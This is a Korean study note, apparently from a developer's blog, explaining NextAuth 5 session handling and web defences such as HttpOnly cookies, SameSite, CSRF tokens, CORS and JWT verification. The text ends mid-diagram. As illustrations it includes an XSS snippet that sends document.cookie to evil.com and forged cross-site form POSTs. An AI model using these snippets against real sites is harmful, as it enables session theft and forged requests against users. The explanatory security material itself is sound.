---
title: 'NextAuth 인증 시스템과 웹 보안'
date: '2026-02-14'
category: '웹 보안'
tags: ['NextAuth', 'JWT', 'CSRF', 'CORS', 'SameSite', 'HttpOnly', 'Cookie', 'Next.js']
description: 'NextAuth 5 기반 인증 흐름과 CSRF, CORS, SameSite, JWT 등 웹 보안 메커니즘을 정리한다'
status: 'in-progress'
---

# NextAuth 인증 시스템과 웹 보안

> 한줄 정의: NextAuth는 Next.js에서 세션 관리를 담당하는 프록시로, 외부 백엔드의 인증 결과를 암호화된 쿠키(JWE)로 관리하며, HttpOnly/SameSite/CSRF 토큰 등 다중 보안 계층으로 세션을 보호한다.

## 목차

- [개요](#개요)
- [NextAuth 초기화와 핵심 구성](#nextauth-초기화와-핵심-구성)
- [인증 흐름 상세](#인증-흐름-상세)
- [API Route 동작 원리](#api-route-동작-원리)
- [쿠키 보안: HttpOnly와 Secure](#쿠키-보안-httponly와-secure)
- [SameSite 쿠키 속성](#samesite-쿠키-속성)
- [CSRF 공격과 방어](#csrf-공격과-방어)
- [CORS와 CSRF의 관계](#cors와-csrf의-관계)
- [JWT 검증 방법](#jwt-검증-방법)
- [보안 계층 종합](#보안-계층-종합)
- [요약](#요약)

## 개요

웹 애플리케이션에서 인증(Authentication)은 "사용자가 누구인지 확인하는 절차"이고, 인가(Authorization)는 "확인된 사용자에게 어떤 권한을 부여할지 결정하는 절차"다. Next.js 환경에서는 **NextAuth**(현재 Auth.js)가 이 인증/세션 관리를 담당하는 대표적인 라이브러리다.

NextAuth 자체가 인증을 수행하는 것은 아니다. 실제 인증(아이디/비밀번호 검증)은 외부 백엔드 API가 담당하고, NextAuth는 그 결과를 안전하게 저장하고 관리하는 **세션 관리 프록시** 역할을 한다. 이 노트에서는 NextAuth 5(beta)를 사용하는 실제 프로젝트를 기반으로 인증 흐름을 추적하고, 이 과정에서 등장하는 웹 보안 메커니즘(CSRF, CORS, SameSite, HttpOnly, JWT 등)을 하나씩 파고든다.

## NextAuth 초기화와 핵심 구성

### NextAuth() 반환값

`NextAuth()` 함수를 호출하면 4개의 핵심 유틸리티가 반환된다.

```ts
// src/lib/auth.ts
export const { handlers, signIn, signOut, auth } = NextAuth({
  providers: [Credentials({...})],
  session: { strategy: 'jwt', maxAge: 30 * 24 * 60 * 60 }, // 30일
  callbacks: { jwt, session },
})
```

| export | 용도 | 사용 환경 |
|--------|------|-----------|
| `handlers` | GET/POST API 라우트 핸들러 | `api/auth/[...nextauth]/route.ts` |
| `signIn` | 프로그래밍 방식 로그인 트리거 | Server Action (서버) |
| `signOut` | 프로그래밍 방식 로그아웃 | 서버 |
| `auth` | 현재 세션 조회 / 미들웨어 래퍼 | 서버 컴포넌트, 미들웨어 |

### 핵심 파일 구조

| 역할 | 파일 |
|------|------|
| NextAuth 설정 | `src/lib/auth.ts` |
| API Route | `src/app/api/auth/[...nextauth]/route.ts` |
| 타입 정의 | `src/types/next-auth.d.ts` |
| JWT 유틸 | `src/utils/jwt.ts` |
| 인증 유틸 | `src/utils/auth.ts` |
| 미들웨어 | `src/middleware.ts` |
| 로그인 페이지 | `src/app/member/sign-in/` |
| 서버 액션 | `src/app/member/sign-in/actions.ts` |
| Axios 인터셉터 | `packages/generated/api/.../axios-instance.ts` |

### 타입 시스템

NextAuth에서 데이터가 흘러가는 3개의 타입 레이어가 있다.

```ts
// 1. User (authorize() 반환값)
{ id, name, email, accessToken, refreshToken }

// 2. JWT (서버 내부 — 쿠키에 암호화 저장)
{ accessToken, refreshToken, id, name, roles, memberType, memberStatus, phone, email, loginChannel }

// 3. Session (클라이언트 노출)
{ accessToken, memberType, memberStatus, loginChannel, user: { id, name, roles, phone, email, columnWriterCode } }
```

`refreshToken`은 JWT 레이어에만 존재하고 Session에는 의도적으로 포함하지 않는다. 이것이 보안 설계의 핵심이다.

## 인증 흐름 상세

전체 인증 흐름은 8단계로 나뉜다.

### 1단계: 로그인 요청 — authorize() 실행

사용자가 로그인 버튼을 클릭하면 다음 순서로 실행된다.

```
SignInForm (클라이언트)
  → handleSignIn(username, password) [Server Action]
    → signIn('credentials', { username, password, redirect: false })
      → NextAuth 내부에서 authorize() 콜백 실행
```

`authorize()` 콜백은 NextAuth의 핵심이다. 이 함수에서 외부 백엔드 API를 호출하고, 결과에 따라 User 객체를 반환하거나 에러를 던진다.

```ts
// authorize() 내부 — 일반 회원 로그인
const result = await fetch('/v1/login', {
  body: { memberId, password, connectionIp, loginChannel: '901001', mmAgreeEvt: 0 }
})

if (result.code === 'R20000') {
  return {
    id: credentials.username,
    name: credentials.username,
    email: null,
    accessToken: result.data.accessToken,
    refreshToken: result.data.refreshToken,
  }
}
```

authorize()는 3가지 로그인 모드를 지원한다.

| 모드 | 조건 | 동작 |
|------|------|------|
| 일반 회원 로그인 | 기본 | `POST /v1/login` 호출 |
| 게스트(비회원) 로그인 | `credentials.type === 'guest'` | `guestTempLogin()` API 호출, 임시 토큰 발급 |
| 테스트 모드 | 개발 환경 + `TEST_REFRESH_TOKEN` 존재 | 환경변수로 자동 인증 우회 |

에러 코드별 처리도 분기된다.

| 코드 | 의미 |
|------|------|
| `R20000` | 성공 |
| `R40106` | 로그인 실패 |
| `R40107` | 비밀번호 5회 연속 실패 |
| `R40108` | 사이트 이관 동의 필요 |

### 2단계: JWT 콜백 — 토큰 저장 및 갱신

`authorize()`가 User를 반환하면 NextAuth는 자동으로 `jwt` 콜백을 실행한다. 이 콜백은 두 가지 시점에서 다르게 동작한다.

**초기 로그인 시 (user가 존재)**

```ts
async jwt({ token, user }) {
  if (user) {
    token.accessToken = user.accessToken
    token.refreshToken = user.refreshToken

    // 백엔드 accessToken을 직접 디코딩해서 회원정보 추출
    const decoded = decodeJWT(user.accessToken)
    token.name = decoded.MM_MEM_NM
    token.roles = decoded.ROLES
    token.memberType = decoded.MM_MEM_TYPE
    // ...
    return token  // NextAuth가 이 token을 쿠키에 암호화하여 저장
  }
}
```

**이후 모든 요청 시 (user가 undefined)**

페이지 이동이나 `useSession()` 호출마다 JWT 콜백이 실행된다.

```ts
async jwt({ token, user }) {
  if (user) { /* 초기 로그인 */ }

  // 토큰 만료 확인 (5분 버퍼)
  if (!isTokenExpired(token.accessToken, 5)) {
    return token  // 유효하면 그대로 반환
  }

  // 만료됐으면 리프레시
  try {
    const newTokens = await refreshAccessToken(token.refreshToken)
    return { ...token, ...newTokens }
  } catch (error) {
    return token
  }
}
```

5분 버퍼를 두고 만료 전에 선제적으로 갱신하기 때문에, 사용자는 토큰 갱신을 전혀 인지하지 못한다.

### 3단계: Session 콜백 — 클라이언트 노출 데이터 선별

JWT 콜백 이후 `session` 콜백이 실행된다. 여기서 JWT 내부 정보를 클라이언트가 접근할 수 있는 Session으로 변환한다.

```ts
async session({ session, token }) {
  session.accessToken = token.accessToken
  session.memberType = token.memberType
  session.user.id = token.id
  session.user.name = token.name
  session.user.roles = token.roles
  // ...

  // token.refreshToken은 여기서 session에 넣지 않음 (보안)
  return session
}
```

> **Q: refreshToken을 클라이언트에 노출하지 않는 이유는?**
> refreshToken은 새로운 accessToken을 발급받을 수 있는 "마스터 키"다. 만약 XSS 공격 등으로 클라이언트 데이터가 노출되더라도 refreshToken은 서버 사이드 JWT 내부에만 존재하므로 안전하다. accessToken은 짧은 수명을 가지지만 refreshToken은 긴 수명을 가지기 때문에, 노출 시 피해 범위가 훨씬 크다.

### 4단계: 클라이언트에서 세션 사용

```ts
const { data: session, update } = useSession()

session.user.name       // "홍길동"
session.user.id         // "test1234"
session.accessToken     // "eyJ..." (API 호출용)
session.memberType      // "MEMBER" 또는 "ORDER"(비회원)
```

`useSession()`이 호출되면 내부적으로 다음 과정이 일어난다.

1. `GET /api/auth/session` 요청
2. NextAuth가 쿠키의 JWT를 복호화
3. `jwt` 콜백 실행 (토큰 갱신 체크)
4. `session` 콜백 실행 (데이터 변환)
5. 결과를 클라이언트에 JSON으로 반환

### 5단계: API 요청 시 자동 토큰 주입

Axios Interceptor가 모든 API 요청에 자동으로 Bearer 토큰을 추가한다.

| 환경 | 세션 획득 방식 |
|------|---------------|
| 클라이언트 | `getSession()` → `session.accessToken` |
| 서버 | `auth()` → `session.accessToken` |

Orval로 자동 생성된 모든 API 호출에 이 인터셉터가 적용되므로, 개별 API 호출에서 토큰을 수동으로 넣을 필요가 없다.

### 6단계: 로그아웃

```ts
async function onLogout(accessToken) {
  // 1. 백엔드에 토큰 무효화 요청
  await fetch('/v1/login/logout-all', { body: { accessToken } })

  // 2. NextAuth 세션 쿠키 삭제
  await signOut({ redirect: false })
  // → 브라우저의 authjs.session-token 쿠키가 제거됨
}
```

NextAuth의 `signOut()`은 쿠키만 삭제한다. 백엔드 토큰 무효화는 별도로 해야 하므로, `onLogout()` 함수에서 백엔드 API를 먼저 호출한 뒤 `signOut()`을 호출한다.

### 7단계: 게스트 세션 자동 정리

`guest-session-guard.tsx` 컴포넌트가 `memberType === 'ORDER'`인 게스트 세션을 감지하고, 구매 페이지에서 이탈(언마운트) 시 자동으로 `onLogout()`을 호출한다. 임시 토큰이 불필요하게 남아 있지 않도록 하는 장치다.

### 8단계: 미들웨어에서의 인증

```ts
// middleware.ts
export default auth((request) => {
  // auth()로 감싸면 request에 세션 정보가 자동 주입됨
  // 디바이스 감지, 점검 모드 체크 등 수행
})
```

`auth()` 함수로 미들웨어를 감싸면 매 요청마다 쿠키의 JWT를 복호화하고 `request.auth`에 세션 정보를 자동 주입한다.

### 전체 흐름 다이어그램

```mermaid
sequenceDiagram
    participant C as 클라이언트
    participant SA as Server Action
    participant NA as NextAuth
    participant BE as 백엔드 API

    Note over C,BE: 로그인 흐름
    C->>SA: handleSignIn(username, password)
    SA->>NA: signIn('credentials', {...})
    NA->>NA: authorize() 콜백 실행
    NA->>BE: POST /v1/login
    BE-->>NA: { accessToken, refreshToken }
    NA->>NA: jwt 콜백 (토큰 + 회원정보 저장)
    NA->>NA: session 콜백 (refreshToken 제외)
    NA-->>C: Set-Cookie: authjs.session-token (JWE 암호화)

    Note over C,BE: 세션 조회 흐름
    C->>NA: useSession() → GET /api/auth/session
    NA->>NA: 쿠키 복호화 → jwt 콜백
    alt 토큰 만료 임박 (5분 이내)
        NA->>BE: POST /v1/login/refresh
        BE-->>NA: 새 토큰
    end
    NA->>NA: session 콜백
    NA-->>C: Session JSON 반환

    Note over C,BE: API 호출 흐름
    C->>NA: Axios Interceptor → getSession()
    NA-->>C: session.accessToken
    C->>BE: Authorization: Bearer {accessToken}
    BE->>BE: 비밀키로 JWT 서명 검증
```

## API Route 동작 원리

### Catch-All Route 구조

```ts
// src/app/api/auth/[...nextauth]/route.ts
import { handlers } from '@/lib/auth'
export const { GET, POST } = handlers
```

이 2줄이 전부다. `[...nextauth]`는 Next.js의 **Catch-All Dynamic Route** 문법이다. `...`은 나머지 경로 세그먼트 전부를 캡처한다는 뜻이다.

```
/api/auth/session              → nextauth = ['session']
/api/auth/signin               → nextauth = ['signin']
/api/auth/signout              → nextauth = ['signout']
/api/auth/callback/credentials → nextauth = ['callback', 'credentials']
/api/auth/csrf                 → nextauth = ['csrf']
/api/auth/providers            → nextauth = ['providers']
```

`/api/auth/` 뒤에 오는 **모든** 경로를 이 하나의 `route.ts`가 처리한다.

### 자동 등록되는 엔드포인트

`handlers`는 `{ GET, POST }` 객체다. NextAuth는 내부적으로 URL 경로를 파싱해서 어떤 동작을 수행할지 결정한다.

**GET 엔드포인트**

| 경로 | 역할 |
|------|------|
| `/api/auth/session` | 현재 세션 반환 |
| `/api/auth/providers` | 사용 가능한 인증 공급자 목록 |
| `/api/auth/csrf` | CSRF 토큰 발급 |
| `/api/auth/signin` | 기본 로그인 페이지 (커스텀 페이지 설정 시 리다이렉트) |
| `/api/auth/signout` | 기본 로그아웃 페이지 |

**POST 엔드포인트**

| 경로 | 역할 |
|------|------|
| `/api/auth/callback/credentials` | Credentials 로그인 검증 |
| `/api/auth/signout` | 로그아웃 실행 |

### GET /api/auth/session — 가장 자주 호출되는 엔드포인트

클라이언트에서 `useSession()`을 사용하면 `SessionProvider`가 이 엔드포인트를 호출한다.

```
useSession() 호출
  → fetch('/api/auth/session')
    → 쿠키에서 authjs.session-token 추출
    → NEXTAUTH_SECRET으로 JWT 복호화
    → jwt 콜백 실행 (토큰 만료 체크 → 갱신)
    → session 콜백 실행 (JWT → Session 변환)
    → JSON 응답 반환
```

호출되는 시점은 페이지 첫 로드, `useSession()` 훅 마운트, `update()` 호출, 브라우저 탭 재포커스(`SessionProvider`의 `refetchOnWindowFocus`) 등이다.

### POST /api/auth/callback/credentials — 로그인 처리

Server Action에서 `signIn('credentials', {...})`을 호출하면 내부적으로 이 엔드포인트가 트리거된다.

```
signIn('credentials', { username, password, redirect: false })
  → CSRF 토큰 검증
  → credentials 파라미터 추출
  → authorize() 콜백 실행
  → 성공 시:
      jwt 콜백 (초기 토큰 생성)
      → JWT를 NEXTAUTH_SECRET으로 암호화
      → Set-Cookie 헤더로 쿠키 설정
  → 실패 시:
      AuthError로 래핑하여 에러 반환
```

쿠키 설정 예시:

```
Set-Cookie: authjs.session-token=eyJ...(암호화된 JWT)...;
  Path=/;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Max-Age=2592000  (30일)
```

### Server Action vs API Route

Server Action에서 호출하는 `signIn()`은 `@/lib/auth`에서 import한 **서버 사이드 함수**다. API Route를 HTTP로 호출하는 것이 아니라, NextAuth 내부 로직을 같은 서버 프로세스 안에서 직접 실행한다.

```ts
// ❌ 클라이언트용 (이 프로젝트에서는 로그인에 사용하지 않음)
import { signIn } from 'next-auth/react'

// ✅ 서버용 (Server Action에서 사용)
import { signIn } from '@/lib/auth'
```

이 구분은 중요하다. 클라이언트용 `signIn()`은 `next-auth/react` 패키지에서 제공하고 HTTP 요청을 보내지만, 서버용 `signIn()`은 NextAuth 인스턴스에서 직접 반환된 함수로 HTTP 요청 없이 내부 로직을 실행한다.

## 쿠키 보안: HttpOnly와 Secure

### HttpOnly 쿠키란?

**HttpOnly**는 쿠키에 설정할 수 있는 보안 플래그다. 이 플래그가 설정된 쿠키는 JavaScript에서 접근할 수 없다.

**일반 쿠키**

```
Set-Cookie: theme=dark; Path=/
```

```js
document.cookie  // "theme=dark" ← JavaScript에서 접근 가능
```

XSS 공격 시 탈취 가능하다.

```html
<script>
  // 공격자가 삽입한 코드
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

**HttpOnly 쿠키**

```
Set-Cookie: authjs.session-token=eyJ...; Path=/; HttpOnly
```

```js
document.cookie  // "" ← HttpOnly 쿠키는 보이지 않음
```

| 특성 | 일반 쿠키 | HttpOnly 쿠키 |
|------|-----------|---------------|
| `document.cookie`로 읽기 | O | **X** |
| JavaScript로 수정/삭제 | O | **X** |
| HTTP 요청 시 자동 전송 | O | O |
| 서버에서 설정/삭제 | O | O |

"HTTP 전송에만(Only) 사용된다"는 의미다. 브라우저가 서버에 요청을 보낼 때는 자동으로 포함하지만, 페이지의 JavaScript에서는 접근할 수 없다.

> **Q: 쿠키가 HttpOnly라 JS에서 못 읽는데, `useSession()`으로 `session.accessToken`은 어떻게 가져오나?**
> `useSession()`은 쿠키를 직접 읽지 않는다. 내부적으로 `GET /api/auth/session` HTTP 요청을 보내고, 브라우저가 이 요청에 쿠키를 자동으로 포함한다(HttpOnly여도 HTTP 전송은 됨). 서버가 쿠키를 복호화해서 필요한 정보만 JSON으로 돌려주는 구조다.

### Secure 플래그

`Secure` 플래그는 HTTPS 연결에서만 쿠키를 전송하도록 제한한다. HTTP(평문) 통신에서는 쿠키가 전송되지 않으므로 중간자 공격(MITM)으로 쿠키가 탈취되는 것을 방지한다.

### NextAuth가 설정하는 쿠키

```
Set-Cookie: authjs.session-token=eyJ...(암호화된 JWT)...;
  Path=/;
  HttpOnly;      ← JS에서 접근 불가
  Secure;        ← HTTPS에서만 전송
  SameSite=Lax;  ← 크로스 사이트 POST 요청 시 전송 안 함
  Max-Age=2592000  ← 30일 유효
```

| 플래그 | 방어 대상 | 설명 |
|--------|-----------|------|
| `HttpOnly` | XSS 공격 | JavaScript에서 쿠키 탈취 방지 |
| `Secure` | 중간자 공격 | HTTP(평문)로는 쿠키 전송 안 함 |
| `SameSite=Lax` | CSRF 공격 | 다른 사이트에서의 POST 요청 시 쿠키 미전송 |

## SameSite 쿠키 속성

### SameSite란?

브라우저가 **크로스 사이트 요청** 시 쿠키를 포함할지 말지를 결정하는 쿠키 속성이다.

### "Same Site"와 "Cross Site"의 정의

"사이트"는 Origin과 다른 개념이다.

```
Origin = 프로토콜 + 도메인 + 포트  (전부 일치해야 Same Origin)
Site   = 도메인의 eTLD+1 부분만    (더 느슨한 비교)
```

**eTLD+1**이란 effective Top-Level Domain(`.com`, `.co.kr`, `.github.io` 등) + 바로 앞 한 단계까지를 의미한다.

```
https://sdijbooks.com           → Site: sdijbooks.com
https://api.sdijbooks.com       → Site: sdijbooks.com  (같은 사이트)
https://dev.sdijbooks.com:3000  → Site: sdijbooks.com  (같은 사이트)
https://evil.com                → Site: evil.com        (다른 사이트)
```

### 3가지 SameSite 옵션

#### SameSite=Strict — 가장 엄격

```
Set-Cookie: session=abc; SameSite=Strict
```

다른 사이트에서 오는 **모든** 요청에 쿠키를 포함하지 않는다. 카카오톡에서 공유 링크를 클릭해도 쿠키가 전송되지 않아 로그인이 풀려 보인다.

| 요청 출처 | 메서드 | 쿠키 전송 |
|-----------|--------|-----------|
| 같은 사이트 | 모든 메서드 | O |
| 다른 사이트 링크 클릭 | GET | **X** |
| 다른 사이트 form POST | POST | **X** |
| 다른 사이트 fetch | 모든 메서드 | **X** |

CSRF를 완벽히 차단하지만, UX가 나쁘다.

#### SameSite=Lax — 균형잡힌 기본값 (NextAuth 사용)

```
Set-Cookie: authjs.session-token=abc; SameSite=Lax
```

다른 사이트에서 오는 **"안전한" 최상위 탐색(GET)**에만 쿠키를 포함한다.

| 요청 출처 | 유형 | 쿠키 전송 |
|-----------|------|-----------|
| 같은 사이트 | 모든 요청 | O |
| 다른 사이트 → 링크 클릭 (GET) | 최상위 탐색 | **O** |
| 다른 사이트 → form POST | 최상위 탐색 | X |
| 다른 사이트 → iframe | 서브 요청 | X |
| 다른 사이트 → fetch/XHR | 서브 요청 | X |
| 다른 사이트 → `<img>` GET | 서브 리소스 | X |

Google 검색 결과에서 링크를 클릭하거나 카카오톡에서 링크를 열었을 때 로그인이 유지된다(GET 최상위 탐색이므로). 하지만 다른 사이트에서의 POST 요청에는 쿠키가 포함되지 않아 CSRF를 방어한다.

> **Q: SameSite=Lax에서 GET 요청에 쿠키가 전송되면 위험하지 않나?**
> GET 요청은 REST 원칙상 상태를 변경하지 않는 "조회" 요청이다. 상태 변경(로그아웃, 결제 등)은 POST로 처리하므로, GET에 쿠키가 전송되어도 CSRF 공격으로 의미 있는 피해를 줄 수 없다. 만약 GET으로 상태를 변경하는 API를 만들었다면 그 설계 자체가 문제다.

#### SameSite=None — 제한 없음

```
Set-Cookie: tracking=xyz; SameSite=None; Secure
```

모든 크로스 사이트 요청에 쿠키를 포함한다. 반드시 `Secure` 플래그와 함께 설정해야 한다. OAuth Provider, 크로스 도메인 결제 위젯, 광고 트래킹 쿠키 등에 사용한다. CSRF 방어가 전혀 없으므로 다른 방어 수단이 필수다.

### 비교 요약

|  | Strict | Lax | None |
|--|--------|-----|------|
| 같은 사이트 | O | O | O |
| 다른 사이트 링크 클릭(GET) | X | **O** | O |
| 다른 사이트 form POST | X | X | O |
| 다른 사이트 fetch/XHR | X | X | O |
| 다른 사이트 iframe | X | X | O |
| CSRF 방어 | 완벽 | 거의 완벽 | 없음 |
| UX | 나쁨 | 좋음 | 제한 없음 |

### 브라우저 기본값

| 브라우저 | SameSite 미설정 시 기본값 |
|----------|--------------------------|
| Chrome 80+ (2020~) | Lax |
| Firefox 69+ | Lax |
| Safari | Strict에 가까운 자체 정책 |
| Edge (Chromium) | Lax |

과거에는 기본값이 `None`이었지만, 2020년부터 대부분의 브라우저가 `Lax`로 변경했다.

## CSRF 공격과 방어

### CSRF란?

**CSRF**(Cross-Site Request Forgery)는 사이트 간 요청 위조 공격이다. 사용자가 로그인된 상태에서 악의적인 사이트가 사용자의 인증 정보(쿠키)를 이용해 요청을 보내는 공격이다.

### 공격 시나리오

1. 사용자가 `sdijbooks.com`에 로그인 (세션 쿠키 저장)
2. 사용자가 악성 사이트 `evil.com` 방문
3. `evil.com`의 HTML에 숨겨진 코드:

```html
<form action="https://sdijbooks.com/api/auth/signout" method="POST">
  <input type="submit" value="무료 쿠폰 받기">
</form>
```

4. 사용자가 "무료 쿠폰 받기"를 클릭하면 브라우저가 `sdijbooks.com`으로 POST 요청을 전송하고, 브라우저가 자동으로 `sdijbooks.com`의 쿠키를 함께 전송한다. 서버는 정상 요청으로 인식하여 로그아웃을 처리한다.

브라우저는 해당 도메인의 쿠키를 자동으로 포함하므로, 다른 사이트에서 보낸 요청도 인증된 요청처럼 보인다.

### NextAuth의 CSRF 방어: CSRF 토큰 방식

**정상적인 흐름:**

```
1. 클라이언트: GET /api/auth/csrf
   → 응답: { csrfToken: "abc123..." }

2. 클라이언트: POST /api/auth/signout
   → Body: { csrfToken: "abc123..." }

3. 서버: csrfToken 일치하면 실행, 불일치하면 거부
```

**CSRF 공격 시:**

```
evil.com → POST /api/auth/signout
  → 쿠키는 자동 전송되지만
  → csrfToken을 모르므로 Body에 포함 불가
  → 서버가 거부
```

CSRF 토큰은 JavaScript로만 읽을 수 있고, 브라우저의 **동일 출처 정책(Same-Origin Policy)** 때문에 `evil.com`의 JavaScript는 `sdijbooks.com`의 응답을 읽을 수 없다. 따라서 공격자는 CSRF 토큰 값을 알아낼 수 없다.

## CORS와 CSRF의 관계

### CORS란?

**CORS**(Cross-Origin Resource Sharing)는 브라우저가 다른 출처(Origin)의 서버로 요청을 보낼 때, 서버가 허용하는지 확인하는 메커니즘이다.

핵심은 **CORS가 응답 읽기를 차단하지, 요청 전송 자체를 항상 막는 것은 아니라는 점**이다.

### Simple Request vs Preflight Request

브라우저는 요청을 두 종류로 구분한다.

**Simple Request — CORS가 못 막음**

다음 조건을 모두 만족하면 "Simple Request"다.

- 메서드: `GET`, `POST`, `HEAD` 중 하나
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 중 하나
- 커스텀 헤더 없음

Simple Request는 Preflight(사전 요청) 없이 바로 서버에 전송된다. CORS는 **응답 읽기**만 차단한다. 서버는 이미 요청을 처리한 뒤다.

```html
<!-- evil.com — Simple Request 공격 -->
<form action="https://sdijbooks.com/api/auth/signout" method="POST">
  <!-- Content-Type: application/x-www-form-urlencoded (기본값) -->
</form>
```

```
1. 브라우저가 POST 요청을 sdijbooks.com으로 전송  ← 전송됨
2. 쿠키도 자동으로 포함                            ← 포함됨
3. 서버가 요청을 처리                              ← 처리됨
4. 응답을 evil.com에서 읽으려 함
5. CORS가 응답 읽기를 차단                         ← 여기서만 차단
```

서버는 이미 요청을 처리했으므로 피해가 발생한다.

**Preflight Request — CORS가 막음**

다음 조건 중 하나라도 해당되면 브라우저가 먼저 `OPTIONS` 요청(Preflight)을 보낸다.

- `Content-Type`이 `application/json`인 경우
- 커스텀 헤더가 있는 경우 (예: `Authorization: Bearer ...`)
- `PUT`, `DELETE`, `PATCH` 메서드인 경우

```js
// evil.com — Preflight가 필요한 요청
fetch('https://sdijbooks.com/api/some-action', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ... }),
  credentials: 'include'
})
```

```
1. 브라우저: OPTIONS /api/some-action 전송 (Preflight)
2. 서버 응답: Access-Control-Allow-Origin에 evil.com 없음
3. 브라우저: 본 요청 전송 차단 ← 방어 성공
```

### 비교 표

| 공격 방식 | CORS가 막나? | 이유 |
|-----------|-------------|------|
| `<form>` POST (기본 Content-Type) | X | Simple Request — Preflight 없이 전송 |
| `<img src="...">` GET | X | Simple Request — 요청 전송됨 (응답만 차단) |
| `fetch()` + `application/json` | **O** | Preflight 필요 — OPTIONS에서 차단 |
| `fetch()` + `Authorization` 헤더 | **O** | Preflight 필요 — OPTIONS에서 차단 |
| `<a href="...">` 클릭 | X | 네비게이션은 CORS 대상 아님 |

### CORS만으로 부족한 이유

`<form>` 전송 같은 "클래식" 공격 방식은 Simple Request에 해당하여 CORS Preflight가 발생하지 않는다. 요청이 서버에 그대로 도달하고, CORS는 응답 읽기만 차단한다. 따라서 NextAuth는 다음과 같은 3중 방어를 구성한다.

```
1층: SameSite=Lax   → evil.com의 POST 요청에 쿠키 미포함
2층: CSRF 토큰      → 토큰 없는 POST 요청 거부
3층: CORS           → fetch() + JSON 요청은 Preflight로 차단
```

## JWT 검증 방법

### JWT 구조

JWT(JSON Web Token)는 `.`으로 구분된 3개의 파트로 구성된다.

```
eyJhbGciOiJIUzI1NiJ9.eyJNTV9NRU1fSUQiOiJ0ZXN0MTIzNCIsImV4cCI6MTcxOH0.abc123signature
 ────────────────────  ──────────────────────────────────────────────────  ──────────────
      Header                              Payload                          Signature
```

각 파트는 Base64URL **인코딩**되어 있다. 암호화가 아니므로 누구나 디코딩할 수 있다.

```json
Header:   { "alg": "HS256", "typ": "JWT" }
Payload:  { "MM_MEM_ID": "test1234", "exp": 1718... }
Signature: HMAC-SHA256(header + "." + payload, 비밀키)
```

### 서명 검증 (Signature Verification)

"이 토큰이 진짜인가?"를 확인하는 과정이다.

**서명 생성 (토큰 발급 시)**

```
Signature = HMAC-SHA256(
  base64url(Header) + "." + base64url(Payload),
  "서버만-아는-비밀키"
)
```

**서명 검증 (토큰 수신 시)**

1. 받은 JWT를 `.`으로 분리
2. 같은 비밀키로 서명을 다시 계산
3. 받은 Signature와 계산된 Signature를 비교
   - 일치 → 위변조되지 않음
   - 불일치 → payload가 조작됨 → 거부

공격자가 payload를 수정하면 Signature도 달라져야 하지만, 비밀키를 모르므로 올바른 Signature를 만들 수 없다.

### 클레임 검증 (Claims Verification)

서명이 올바르더라도 추가 검증이 필요하다.

```json
{
  "exp": 1718000000,           // 만료 시간 (Expiration)
  "iat": 1717900000,           // 발급 시간 (Issued At)
  "nbf": 1717900000,           // 사용 시작 시간 (Not Before)
  "iss": "api.sdijbooks.com",  // 발급자 (Issuer)
  "aud": "sdijbooks.com",      // 수신자 (Audience)
  "sub": "test1234"            // 주체 (Subject)
}
```

| 검증 항목 | 확인 내용 |
|-----------|-----------|
| `exp > 현재시간` | 만료되지 않았는가 |
| `iat <= 현재시간` | 미래에서 발급된 건 아닌가 |
| `nbf <= 현재시간` | 사용 가능한 시점인가 |
| `iss === 예상 발급자` | 올바른 서버에서 발급했는가 |
| `aud === 예상 수신자` | 이 서비스용 토큰인가 |

### 서명 알고리즘 종류

**HMAC (대칭키) — HS256, HS384, HS512**

하나의 비밀키로 서명 생성과 검증을 모두 수행한다. 발급자와 검증자가 같은 키를 공유해야 하므로 단일 서버 또는 신뢰할 수 있는 서비스 간에 사용한다. 속도가 빠르다.

**RSA (비대칭키) — RS256, RS384, RS512**

개인키(Private Key)로 서명하고, 공개키(Public Key)로 검증한다. 개인키는 발급 서버만 보유하고 공개키는 누구나 가질 수 있으므로, 발급 서버와 검증 서버를 분리할 수 있다. 마이크로서비스 환경에 적합하다.

**ECDSA (타원곡선) — ES256, ES384, ES512**

RSA와 같은 비대칭키 방식이지만 키 크기가 작다. RSA보다 짧은 키로 동일 보안 수준을 제공하므로, 토큰 크기를 절약할 수 있다.

### 이 프로젝트의 이중 JWT

이 프로젝트에는 두 종류의 JWT가 존재한다.

**백엔드 JWT (accessToken, refreshToken)**

백엔드 API 서버가 발급하는 일반적인 JWT(서명됨)다. 프론트엔드에서는 서명 검증을 하지 않고 payload만 읽는다.

```ts
// src/utils/jwt.ts
export function decodeJWT(token: string) {
  const parts = token.split('.')
  const payload = parts[1]
  // Base64 디코딩만 수행 — 서명 검증 없음
  return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'))
}
```

프론트엔드에서 서명 검증을 하지 않는 이유는, 백엔드의 비밀키를 프론트엔드에 둘 수 없기 때문이다. 어차피 API 호출 시 백엔드가 직접 검증하므로, 프론트엔드는 토큰 내용을 참고용으로만 읽는다.

**NextAuth JWT (세션 쿠키)**

NextAuth가 `NEXTAUTH_SECRET`으로 **암호화**하여 쿠키에 저장하는 토큰이다. 일반 JWT와 달리 **JWE(JSON Web Encryption)** 방식을 사용하여 payload 자체가 암호화된다.

| 구분 | 백엔드 JWT | NextAuth JWT |
|------|-----------|--------------|
| 방식 | JWS (서명만) | JWE (암호화) |
| Payload 노출 | Base64 디코딩으로 읽기 가능 | `NEXTAUTH_SECRET` 없이 읽기 불가 |
| 발급/검증 | 백엔드 API 서버 | NextAuth (프론트 서버) |
| 프론트에서의 역할 | payload 읽기 + API 호출 시 전달 | 쿠키로 자동 관리 (직접 접근 X) |

## 보안 계층 종합

NextAuth가 구성하는 보안은 5개의 계층으로 이루어진다.

```
┌─────────────────────────────────────────────┐
│        1층: HttpOnly + Secure 쿠키          │
│   세션 토큰을 JS에서 읽을 수 없음           │
│   XSS 공격으로 세션 탈취 불가               │
├─────────────────────────────────────────────┤
│        2층: SameSite=Lax                    │
│   다른 사이트의 POST 요청에 쿠키 미포함     │
│   기본적인 CSRF 방어                        │
├─────────────────────────────────────────────┤
│        3층: CSRF 토큰                       │
│   모든 POST 요청에 토큰 필수                │
│   SameSite로 부족한 경우를 보완             │
├─────────────────────────────────────────────┤
│        4층: JWT 암호화 (NEXTAUTH_SECRET)    │
│   쿠키 내용을 탈취해도 복호화 불가          │
│   토큰 위변조 불가                          │
├─────────────────────────────────────────────┤
│        5층: refreshToken 미노출             │
│   session 콜백에서 의도적 제외              │
│   accessToken이 노출되어도 refreshToken은   │
│   안전                                      │
